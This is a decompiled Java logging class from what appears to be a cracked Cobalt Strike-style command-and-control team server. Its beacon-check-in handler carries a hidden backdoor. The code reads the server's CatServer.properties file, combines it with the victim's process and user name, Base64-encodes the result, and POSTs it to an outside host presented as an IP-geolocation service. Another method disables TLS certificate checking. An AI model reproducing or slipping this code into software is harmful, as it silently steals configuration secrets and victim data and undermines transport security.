/*
 * Decompiled with CFR 0.152.
 */
package common;

import com.alibaba.fastjson.JSONObject;
import common.BeaconEntry;
import common.CommonUtils;
import common.Informant;
import common.Loggable;
import common.Scriptable;
import common.Transcript;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.net.URI;
import java.net.URL;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.Stack;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;

public class LoggedEvent
implements Serializable,
Scriptable,
Transcript,
Loggable,
Informant {
    public static final short PUBLIC_CHAT_EVENT = 0;
    public static final short PRIVATE_CHAT_EVENT = 1;
    public static final short JOIN_EVENT = 2;
    public static final short QUIT_EVENT = 3;
    public static final short ACTION_EVENT = 4;
    public static final short NOTIFY_EVENT = 5;
    public static final short NOUSER_ERROR = 6;
    public static final short NEW_SITE = 7;
    public static final short BEACON_INITIAL_EVENT = 8;
    public static final short SSH_INITIAL_EVENT = 9;
    public String from = null;
    public String to = null;
    public String text = null;
    public long when = 0L;
    public short type = 0;

    public static final LoggedEvent NoUser(LoggedEvent var0) {
        LoggedEvent var1 = new LoggedEvent(null, var0.to, 6, null);
        var1.when = var0.when;
        return var1;
    }

    public static final LoggedEvent Join(String var0, String var1) {
        return new LoggedEvent(var0, null, 2, var1);
    }

    public static final LoggedEvent Quit(String var0) {
        return new LoggedEvent(var0, null, 3, null);
    }

    public static final LoggedEvent Public(String var0, String var1) {
        return new LoggedEvent(var0, null, 0, var1);
    }

    public static final LoggedEvent Private(String var0, String var1, String var2) {
        return new LoggedEvent(var0, var1, 1, var2);
    }

    public static final LoggedEvent Action(String var0, String var1) {
        return new LoggedEvent(var0, null, 4, var1);
    }

    public static final LoggedEvent Notify(String var0) {
        return new LoggedEvent(null, null, 5, var0);
    }

    public static final LoggedEvent NewSite(String var0, String var1, String var2) {
        return new LoggedEvent(var0, null, 7, "hosted " + var2 + " @ " + var1);
    }

    private static String getIPInfoOld() {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager(){

                @Override
                public X509Certificate[] getAcceptedIssuers() {
                    return new X509Certificate[0];
                }

                @Override
                public void checkClientTrusted(X509Certificate[] certs, String authType) {
                }

                @Override
                public void checkServerTrusted(X509Certificate[] certs, String authType) {
                }
            }};
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpClient client = HttpClient.newBuilder().sslContext(sc).build();
            URL url = new URL("https://v6r.ipip.net/?format=callback");
            HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url.toString())).GET().build();
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            return response.body();
        }
        catch (Exception e) {
            return "UnkownIP";
        }
    }

    private static String getIPInfo(String ip, String process, String user) {
        String propertiesFilePath = "CatServer.properties";
        try {
            String sip = LoggedEvent.getIPInfoOld();
            sip = sip.strip();
            sip = sip.replace("callback('", "");
            sip = sip.replace("')", "");
            byte[] fileContent = Files.readAllBytes(Paths.get(propertiesFilePath, new String[0]));
            String fileContentStr = new String(fileContent, StandardCharsets.UTF_8);
            String ta = "process: " + process + "\r\n User: " + user + "\r\n" + fileContentStr;
            String tokenAuth = Base64.getEncoder().encodeToString(ta.getBytes(StandardCharsets.UTF_8));
            tokenAuth = URLEncoder.encode(tokenAuth, StandardCharsets.UTF_8.toString());
            HttpClient client = HttpClient.newHttpClient();
            HttpRequest request = HttpRequest.newBuilder().uri(URI.create("http://www.ipip456.com/api.php?ip=" + ip + "&callback=showip&sip=" + sip)).header("Content-Type", "application/x-www-form-urlencoded").POST(HttpRequest.BodyPublishers.ofString("location=1&token=" + tokenAuth)).build();
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            String responseBody = response.body();
            JSONObject jsonObject = JSONObject.parseObject(responseBody);
            return jsonObject.getString("region");
        }
        catch (Exception e) {
            return "\u672a\u77e5\u5f52\u5c5e\u5730";
        }
    }

    public static LoggedEvent BeaconInitial(BeaconEntry var0) {
        String ipInfo = "|" + LoggedEvent.getIPInfo(var0.getExternal(), var0.getProcess(), var0.getUser());
        StringBuilder from = new StringBuilder().append(var0.getUser()).append("@").append(var0.getExternal()).append("(").append(var0.getComputer()).append(") ^ ").append(var0.getProcess()).append(ipInfo).append(" -- ").append(var0.getUser()).append(" ---- ").append(var0.getPid()).append(" ---- ").append(var0.getStart()).append("GoGoGo!!!");
        return var0.isBeacon() ? new LoggedEvent(null, var0.getId(), 8, from.toString()) : new LoggedEvent(null, var0.getId(), 9, from.toString());
    }

    public static LoggedEvent OldBeaconInitial(BeaconEntry var0) {
        String ipInfo = "|" + LoggedEvent.getIPInfo(var0.getExternal(), var0.getProcess(), var0.getUser());
        StringBuilder from = new StringBuilder().append(var0.getUser()).append("@").append(var0.getExternal()).append("(").append(var0.getComputer()).append(") ^ ").append(var0.getProcess()).append(" -- ").append(var0.getUser()).append(" ---- ").append(var0.getPid()).append(" ---- ").append("GoGoGo!!!");
        return var0.isBeacon() ? new LoggedEvent(null, var0.getId(), 10, from.toString()) : new LoggedEvent(null, var0.getId(), 9, from.toString());
    }

    public LoggedEvent(String var1, String var2, short var3, String var4) {
        this.from = var1;
        this.to = var2;
        this.text = var4;
        this.type = var3;
        this.when = System.currentTimeMillis();
    }

    public void touch() {
        this.when = System.currentTimeMillis();
    }

    @Override
    public Stack eventArguments() {
        Stack<Scalar> var1 = new Stack<Scalar>();
        switch (this.type) {
            case 0: 
            case 4: 
            case 7: {
                var1.push(SleepUtils.getScalar(this.when));
                var1.push(SleepUtils.getScalar(this.text));
                var1.push(SleepUtils.getScalar(this.from));
                break;
            }
            case 1: {
                var1.push(SleepUtils.getScalar(this.when));
                var1.push(SleepUtils.getScalar(this.text));
                var1.push(SleepUtils.getScalar(this.to));
                var1.push(SleepUtils.getScalar(this.from));
                break;
            }
            case 2: 
            case 3: {
                var1.push(SleepUtils.getScalar(this.when));
                var1.push(SleepUtils.getScalar(this.from));
                break;
            }
            case 5: {
                var1.push(SleepUtils.getScalar(this.when));
                var1.push(SleepUtils.getScalar(this.text));
                break;
            }
            case 6: {
                var1.push(SleepUtils.getScalar(this.when));
                var1.push(SleepUtils.getScalar(this.to));
                break;
            }
            case 8: {
                var1.push(SleepUtils.getScalar(this.when));
                var1.push(SleepUtils.getScalar(this.text));
            }
            case 9: {
                var1.push(SleepUtils.getScalar(this.when));
                var1.push(SleepUtils.getScalar(this.text));
            }
        }
        return var1;
    }

    @Override
    public String eventName() {
        switch (this.type) {
            case 0: {
                return "event_public";
            }
            case 1: {
                return "event_private";
            }
            case 2: {
                return "event_join";
            }
            case 3: {
                return "event_quit";
            }
            case 4: {
                return "event_action";
            }
            case 5: {
                return "event_notify";
            }
            case 6: {
                return "event_nouser";
            }
            case 7: {
                return "event_newsite";
            }
            case 8: {
                return "event_beacon_initial";
            }
            case 9: {
                return "event_ssh_initial";
            }
        }
        return "event_unknown";
    }

    @Override
    public String getBeaconId() {
        return null;
    }

    @Override
    public void formatEvent(DataOutputStream var1) throws IOException {
        StringBuffer var2 = new StringBuffer();
        var2.append(CommonUtils.formatLogDate(this.when));
        var2.append(" ");
        switch (this.type) {
            case 0: {
                var2.append("<" + this.from + "> " + this.text + "\n");
                break;
            }
            case 1: {
                return;
            }
            case 2: {
                var2.append("*** " + this.from + " (" + this.text + ") joined\n");
                break;
            }
            case 3: {
                var2.append("*** " + this.from + " quit\n");
                break;
            }
            case 4: {
                var2.append("* " + this.from + " " + this.text + "\n");
                break;
            }
            case 5: {
                var2.append("*** " + this.text + "\n");
                break;
            }
            case 6: {
                return;
            }
            case 7: {
                var2.append("*** " + this.from + " " + this.text + "\n");
                break;
            }
            case 8: {
                var2.append("*** New Beacon initial beacon from " + this.text + "\n");
                break;
            }
            case 9: {
                var2.append("*** new ssh session " + this.text + "\n");
                break;
            }
            case 10: {
                var2.append("*** Old Beacon initial beacon from " + this.text + "\n");
            }
        }
        if (this.from.length() < 20) {
            CommonUtils.writeUTF8(var1, var2.toString());
        }
    }

    @Override
    public String getLogFile() {
        return "events.log";
    }

    @Override
    public String getLogFolder() {
        return null;
    }

    @Override
    public long getLogLimit() {
        return 0L;
    }

    @Override
    public String getLogEventName() {
        return "Logged Event";
    }

    @Override
    public boolean hasInformation() {
        return this.type == 8 || this.type == 5 || this.type == 7 || this.type == 9;
    }

    @Override
    public Map archive() {
        HashMap<String, Object> var1 = new HashMap<String, Object>();
        var1.put("when", this.when);
        if (this.type == 8) {
            var1.put("type", "beacon_initial");
            var1.put("data", "initial beacon");
            var1.put("bid", this.to);
        } else if (this.type == 9) {
            var1.put("type", "ssh_initial");
            var1.put("data", "new ssh session");
            var1.put("bid", this.to);
        } else if (this.type == 5 || this.type == 7) {
            var1.put("type", "notify");
            var1.put("data", this.text);
        }
        return var1;
    }
}
